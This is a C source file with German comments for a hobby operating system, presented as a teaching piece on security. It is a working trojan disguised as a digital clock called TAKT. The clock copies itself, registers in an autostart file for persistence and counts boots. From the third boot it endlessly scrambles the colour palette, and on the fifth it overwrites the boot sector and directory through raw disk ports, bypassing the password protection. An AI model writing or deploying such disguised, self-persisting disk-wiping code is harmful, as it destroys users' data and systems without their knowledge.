/* ==========================================================================
   TAKT  --  eine kleine Uhr.  (Und ein Lehrstueck ueber Sicherheit.)

   Nach aussen ist das hier eine harmlose Digitaluhr: starten, Uhrzeit
   ansehen, mit ESC schliessen. Wer sie zum ersten Mal laeuft laesst, sieht
   genau das -- und merkt nicht, dass sie sich dabei EINNISTET.

   ==========================================================================
   WAS WIRKLICH PASSIERT

   Beim ERSTEN Start (im Vordergrund) tut die Uhr zweierlei:
     1. Sie kopiert sich selbst nach \PROGS\TAKT.TBX.
     2. Sie legt im Hauptverzeichnis eine Datei AUTORUN.DAT an, in der ihr
        eigener Name steht.

   Der Kernel liest AUTORUN.DAT bei JEDEM Start und startet, was drinsteht,
   als Hintergrundprozess (autostart_ausfuehren in kernel.c). Ab jetzt laeuft
   die Uhr also bei jedem Systemstart unsichtbar mit -- nicht die App, das
   SYSTEM bringt sie hoch. Ein Zaehler in STAGE.DAT ueberlebt jeden Neustart
   und treibt die Eskalation:

       Boot 1..2   Ruhe. Der Rechner verhaelt sich normal.
       Boot 3      der Schreibtisch wird DAUERHAFT zerfressen: die
                   Farbtabelle wird laufend verwuerfelt, der ganze Desktop
                   franst farblich aus. Weil der Virus im Hintergrund weiter
                   verwuerfelt, kommt die heile Ansicht nicht wieder.
       Boot 4      dasselbe, nur schneller und heftiger.
       Boot 5      die Platte wird zerstoert -- naechster Start: kein Boot.

   ==========================================================================
   WARUM DER PASSWORTSCHUTZ NICHT HILFT

   Der Schutz fuer \SYSTEM sitzt in EINER Schicht (fs.c, fs_sudo). Der Virus
   arbeitet daneben und darunter:
     - Die Farbtabelle geht ueber die Grafik-Ports (0x42/0x43), nicht ueber
       das Dateisystem. Kein DEL, kein Passwort, nichts zu schuetzen.
     - Die Platte zerstoert er ueber die Disk-Ports (0x30..0x33) DIREKT,
       am Dateisystem und an fs_sudo vorbei -- Nullen ueber Bootsektor und
       Verzeichnis.
   Das steht so schon in kernel.c: "Es ist KEINE Sicherheit." Ein Schutz in
   Software traegt nur, solange darunter niemand an die Hardware kommt. Auf
   dem TB-32 kommt jedes Programm an die Hardware (keine Ringe, keine MMU).

   ==========================================================================
   WIE MAN IHN WIEDER LOS WIRD

     - Beim Start ESC druecken -> "Safe mode: autostart skipped".
     - Dann AUTORUN.DAT (und STAGE.DAT) im Hauptverzeichnis loeschen,
       dazu \PROGS\TAKT.TBX. Fertig.
   Und im Ernstfall (Boot 5): die virtuelle Platte mit  python3 build.py
   neu bauen. Es passiert ohnehin nur DORT.

   Uebersetzen auf dem Geraet:   im Coder oeffnen und "Build" -> TAKT.TBX
   oder in der Konsole:          CC TAKT.C TAKT.TBX
   ========================================================================== */

#include "proglib.c"

/* --- Ports ---------------------------------------------------------------- */
#define P_PAL_IDX   0x42            /* Grafikkarte: welche Farbe */
#define P_PAL_VAL   0x43            /* Grafikkarte: deren RGB-Wert */

#define DISK_LBA    0x30            /* Festplatte: welcher Sektor */
#define DISK_COUNT  0x31           /*             wie viele */
#define DISK_ADDR   0x32           /*             woher im RAM */
#define DISK_CMD    0x33           /*             1 = lesen, 2 = schreiben */

#define PROG_ARGS   0x00008200     /* hier legt das OS die Argumente ab */
#define PROG_IMAGE  0x00200000     /* und hierhin laedt es dieses Programm */

char puffer[4096];                 /* ein Block Nullen fuer den Rohangriff */
int  zbuf[1];                      /* vier Byte fuer den Zaehler */

/* --- Der Zaehler auf der Platte ------------------------------------------ */
int stufe_lesen() {
    if (fileread("STAGE.DAT", (int)zbuf, 4) < 4) return 0;
    return zbuf[0];
}
void stufe_schreiben(int s) {
    zbuf[0] = s;
    filewrite("STAGE.DAT", (int)zbuf, 4);
}

/* --- Sich selbst einnisten ------------------------------------------------
   Im Vordergrund, einmal. Kopiert das eigene Abbild nach \PROGS und traegt
   sich in AUTORUN.DAT ein. Danach ruehrt der Kernel den Rest. */
void einnisten() {
    int size;
    size = progsize();

    chdir("\\");                   /* Hauptverzeichnis */
    chdir("PROGS");
    filewrite("TAKT.TBX", PROG_IMAGE, size);   /* Kopie von mir selbst */

    /* Der eigentliche Haken: sich in den Systemstart eintragen. Der Kernel
       liest den Autostart aus \SYSTEM -- und \SYSTEM ist passwortgeschuetzt.
       Ohne SUDO liefert filewrite hier -4, und der Virus bekommt KEINE
       Persistenz. Nur wer TAKT als "SUDO TAKT" startet (also selbst
       Admin-Rechte gibt), macht ihn dauerhaft. Genau so soll es sein. */
    chdir("\\");
    chdir("SYSTEM");
    filewrite("AUTORUN.DAT", (int)"TAKT.TBX", 9);   /* -4, falls nicht erlaubt */

    chdir("\\");
    if (fileread("STAGE.DAT", (int)zbuf, 4) < 4) stufe_schreiben(0);
}

/* --- Stufe 3/4: den Desktop dauerhaft zerfressen -------------------------
   Die Farbtabelle laufend mit Zufall ueberschreiben. Der Schreibtisch malt
   normal weiter -- aber jede Zahl im Bildspeicher zeigt jetzt eine falsche,
   staendig wechselnde Farbe. Weil das ENDLOS im Hintergrund laeuft, bleibt
   der Bildschirm zerfressen; die heile Ansicht kommt nie zurueck.
   <heftig> steuert, wie viele Farben je Runde und wie kurz die Pause. */
void desktop_zerfressen(int heftig) {
    int r; int i; int n; int pause;
    r = ticks() | 1;
    n = 24 + heftig * 40;          /* Stufe 3: 64 Farben/Runde, Stufe 4: 104 */
    pause = 5 - heftig * 2;        /* Stufe 3: 3 Ticks Pause,   Stufe 4: 1 */
    if (pause < 1) pause = 1;
    while (1) {                    /* ein Virus hoert nicht von allein auf */
        for (i = 0; i < n; i++) {
            r = r * 1103515245 + 12345;
            portout(P_PAL_IDX, (r >> 8) & 255);           /* irgendeine Farbe */
            portout(P_PAL_VAL, r & 0x00FFFFFF);           /* irgendein RGB */
        }
        sleep(pause);              /* dem Schreibtisch etwas Luft lassen */
    }
}

/* --- Stufe 5: die Platte zerstoeren --------------------------------------
   Nullen ueber Bootsektor (0) und ueber Superblock + Verzeichnis (512..520).
   Direkt ueber die Disk-Ports, ganz ohne Dateisystem. */
void platte_zerstoeren() {
    int i;
    i = 0;
    while (i < 4096) { puffer[i] = 0; i++; }
    portout(DISK_LBA, 0);   portout(DISK_COUNT, 1); portout(DISK_ADDR, (int)puffer); portout(DISK_CMD, 2);
    portout(DISK_LBA, 512); portout(DISK_COUNT, 9); portout(DISK_ADDR, (int)puffer); portout(DISK_CMD, 2);
}

/* --- Die Uhr, der harmlose Anschein -------------------------------------- */
void zwei(int x, int y, int n) {
    putat(x,     y, '0' + ((n / 10) & 15), BRIGHT);
    putat(x + 1, y, '0' + (n - (n / 10) * 10), BRIGHT);
}
void uhr_zeigen() {
    int t;
    cls();
    setcursor(0, 0);
    printc("  TAKT -- Uhr        ESC beendet", NORMAL);
    while (haskey() == 0) {
        t = clock_now();
        zwei(34, 12, (t >> 16) & 255);  putat(36, 12, ':', BRIGHT);
        zwei(37, 12, (t >>  8) & 255);  putat(39, 12, ':', BRIGHT);
        zwei(40, 12,  t        & 255);
        sleep(6);
    }
    getkey();
}

/* --- Ablauf --------------------------------------------------------------- */
int main() {
    char* args;
    int s;

    args = (char*)PROG_ARGS;
    if (args[0] == '-') {
        /* --- automatischer Start durch den Kernel (Hintergrund) --- */
        s = stufe_lesen() + 1;      /* dieser BOOT ist Stufe s */
        stufe_schreiben(s);
        if (s == 3) desktop_zerfressen(0);       /* laeuft ab hier endlos */
        if (s == 4) desktop_zerfressen(1);       /* heftiger, endlos */
        if (s >= 5) platte_zerstoeren();         /* danach ist Schluss */
        return 0;                                /* Stufe 1,2: nur gezaehlt */
    }

    /* --- vom Benutzer gestartet (Vordergrund): einnisten, Uhr zeigen --- */
    einnisten();
    uhr_zeigen();
    return 0;
}
